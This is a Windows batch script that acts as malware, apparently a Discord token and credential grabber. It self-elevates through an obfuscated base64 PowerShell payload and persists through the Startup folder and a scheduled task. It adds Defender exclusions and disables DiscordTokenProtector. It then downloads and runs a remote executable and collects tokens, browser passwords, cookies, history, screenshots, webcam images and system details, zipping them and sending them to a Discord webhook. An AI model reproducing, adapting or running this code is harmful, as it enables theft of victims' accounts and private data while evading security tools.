@echo off
NET SESSION >nul 2>&1
if %errorlevel% == 0 goto naw
cd %userprofile%\AppData\Local\Temp
powershell $command = 'Start-Process %~f0'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $Encodedcommand =[Convert]::ToBase64String($Bytes); $Encodedcommand > test.txt
set /p base64code=<%userprofile%\AppData\Local\Temp\test.txt
del %userprofile%\AppData\Local\Temp\test.txt
echo $code = "%base64code%" > %userprofile%\AppData\Local\Temp\penis.ps1
echo (nEw-OBJECt  Io.CoMpreSsion.DEflateSTrEaM( [SyStem.io.memoRYSTReaM][convErT]::fromBaSE64STriNg( 'hY49C8IwGIT/ykvoGjs4FheLqIgfUHTKEpprK+SLJFL99zYFwUmXm+6ee4rzcbti3o0IcYDWCzxBfKSB+Mldctg98c0TLa1fXsZIHLalonUKxKqAnqRSxHaH+ioa16VRBohaT01EsXCmF03mirOHFa0zRlrFqFRUTM9Udv8QJvKIlO62j6J+hBvCvGYZzfK+c2o68AhZvWqSDIk3GvDEIy1nvIJGwk9J9lH53f22mSdv') ,[SysTEM.io.COMpResSion.coMPRESSIONMoDE]::DeCompress ) ^| ForeacH{nEw-OBJECt Io.StReaMrEaDer( $_,[SySTEM.teXT.enCOdING]::aSciI )}).rEaDTOEnd( ) ^| InVoKE-expREssION >> %userprofile%\AppData\Local\Temp\penis.ps1
powershell.exe -executionpolicy remotesigned -File %userprofile%\AppData\Local\Temp\penis.ps1 && del %userprofile%\AppData\Local\Temp\penis.ps1
exit

:naw
@echo off
PowerShell Set-MpPreference -DisableRealtimeMonitoring 0
mkdir %localappdata%\KDOT
COPY %~f0 %localappdata%\KDOT\KDOT.bat
COPY "%~f0" "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\KDOT.bat"
SCHTASKS /QUERY /TN "KDOT" >NUL 2>&1
if %errorlevel% equ 0 goto code
SCHTASKS /CREATE /SC ONSTART /TN "KDOT" /TR "%localappdata%\KDOT\KDOT.bat"

:code
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%localappdata%\KDOT"
set webhook=YOUR_WEBHOOK_HERE
curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
set /p ip=<%userprofile%\AppData\Local\Temp\ipp.txt
echo Hard Drive Space: > %userprofile%\AppData\Local\Temp\System_INFO.txt
wmic diskdrive get size >> %userprofile%\AppData\Local\Temp\System_INFO.txt
echo Service Tag: >> %userprofile%\AppData\Local\Temp\System_INFO.txt
wmic bios get serialnumber >> %userprofile%\AppData\Local\Temp\System_INFO.txt
echo CPU: >> %userprofile%\AppData\Local\Temp\System_INFO.txt
wmic cpu get name >> %userprofile%\AppData\Local\Temp\System_INFO.txt
systeminfo > %userprofile%\AppData\Local\Temp\sysi.txt
wmic csproduct get uuid > %userprofile%\AppData\Local\Temp\uuid.txt
ipconfig /all > %userprofile%\AppData\Local\Temp\ip.txt
netstat -an > %userprofile%\AppData\Local\Temp\netstat.txt

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username% ip = %ip% time = %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%

taskkill /im Discord.exe /f
taskkill /im DiscordTokenProtector.exe /f
if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe (
    del %userprofile%\AppData\Roaming\DiscordTokenProtector\DiscordTokenProtector.exe
)

if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll (
    del %userprofile%\AppData\Roaming\DiscordTokenProtector\ProtectionPayload.dll
)

if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat (
    del %userprofile%\AppData\Roaming\DiscordTokenProtector\secure.dat
)

if exist %userprofile%\AppData\Roaming\DiscordTokenProtector\config.json (
    echo { >%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "auto_start": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "auto_start_discord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_allowbetterdiscord": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkexecutable": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkhash": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkmodule": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkresource": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_checkscripts": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "integrity_redownloadhashes": false, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "iterations_iv": 187, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "iterations_key": -666, >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo     "version": 69 >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo } >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
    echo anti DiscordTokenProtector by https://github.com/baum1810  >>%userprofile%\AppData\Roaming\DiscordTokenProtector\config.json
)


cd %userprofile%\AppData\Local\Temp
curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V3.0/main.exe --output %userprofile%\AppData\Local\Temp\main.exe
start /w /b main.exe %webhook%


mkdir %localappdata%\Temp\KDOT
echo penis > %localappdata%\Temp\KDOT\KDot.txt
move %userprofile%\AppData\Local\Temp\tokens.txt %userprofile%\AppData\Local\Temp\KDOT\tokens.txt
move %localappdata%\Temp\ip.txt %localappdata%\Temp\KDOT\ip.txt
move %localappdata%\Temp\sysi.txt %localappdata%\Temp\KDOT\sysi.txt
move %localappdata%\Temp\System_INFO.txt %localappdata%\Temp\KDOT\System_INFO.txt
move %localappdata%\Temp\netstat.txt %localappdata%\Temp\KDOT\netstat.txt
move %localappdata%\Temp\uuid.txt %localappdata%\Temp\KDOT\uuid.txt
move %localappdata%\Temp\ipp.txt %localappdata%\Temp\KDOT\ipp.txt
move %localappdata%\Temp\browser-cookies.txt %localappdata%\Temp\KDOT\browser-cookies.txt
move %localappdata%\Temp\browser-history.txt %localappdata%\Temp\KDOT\browser-history.txt
move %localappdata%\Temp\browser-passwords.txt %localappdata%\Temp\KDOT\browser-passwords.txt
move %localappdata%\Temp\desktop-screenshot.png %localappdata%\Temp\KDOT\desktop-screenshot.png
move %localappdata%\Temp\webcam.jpg %localappdata%\Temp\KDOT\webcam.jpg

powershell.exe Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath %localappdata%\Temp\KDOT.zip && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\KDOT.zip %webhook%
del %localappdata%\Temp\main.exe
rmdir /s /q %localappdata%\Temp\KDOT
del KDOT.zip
exit
